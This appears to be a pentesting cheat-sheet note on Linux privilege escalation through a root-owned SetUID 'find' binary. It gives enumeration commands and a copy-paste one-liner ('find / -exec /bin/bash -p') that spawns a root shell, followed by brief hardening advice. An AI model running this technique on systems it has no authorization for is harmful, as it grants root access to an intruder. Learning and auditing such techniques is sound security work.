# 🧨 Privilege Escalation via SUID `find` Binary

## 🔍 Summary

If the `find` binary is **SetUID** and **owned by root**, you can use it to execute arbitrary commands **as root** — including spawning a root shell.

---

## 🔐 Why It Works

- **SetUID** (`-4000` permission) makes a binary execute with **the owner’s privileges**, not the user's.
    
- If a binary is owned by **root** and SetUID, it will run as **root** even when called by a low-priv user.
    
- `find` supports `-exec` which runs arbitrary commands.
    
- If you use `find` to execute a **shell** that supports `-p` (like `bash`, `rbash`, or `sh`), 

By default, when `bash` detects it's being executed as a **SetUID** binary (e.g., owned by root, but executed by a normal user), it **drops privileges** for security reasons — meaning it refuses to run with elevated permissions.  

<mark style="background: #e74c3c;">  the `-p` flag tells the shell **not to drop privileges**, giving you a **root shell**.

## 🧪 Step-by-Step Exploitation

### 🔎 1. Find SUID binaries


`find / -perm -4000 2>/dev/null`

✅ Look for `/usr/bin/find`

---

### 🔍 2. Check if `find` is root-owned and has SUID



`ls -l /usr/bin/find`

Output should look like:

`-rwsr-xr-x 1 root root ... /usr/bin/find`

The `s` in `rws` confirms SUID.

---

### 🔎 3. Find an executable shell

Check which shells are present:

	cat /etc/shells

Then check their permissions:

	cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done

✅ Look for:

- `/bin/bash`, `/bin/sh`, or `/bin/rbash`
    
- Preferably symlinks to `bash`, which supports the `-p` flag
    

---

### 🚀 4. Exploit with `find` + shell

Spawn a root shell:

	/usr/bin/find / -exec /bin/bash -p \; -quit

Or:

	/usr/bin/find / -exec /bin/rbash -p \; -quit

Confirm you're root:

`whoami`

## 🧷 Mitigation (For Hardening Notes)

If you're a defender or auditing a system:

- **NEVER** give SetUID to binaries like `find`, `vim`, `cp`, etc.
    
- Run:
    
    `chmod u-s /usr/bin/find`
    
- Use AppArmor or SELinux to restrict execution
    
- Regularly audit with:
    
    `find / -perm -4000 -type f 2>/dev/null`

## ✅ Quick Copy-Paste One-Liner

	/usr/bin/find / -exec /bin/bash -p \; -quit

---

# **If find isn't available:**


	ls -l /bin /sbin /usr/bin /usr/sbin 2>/dev/null | grep rws
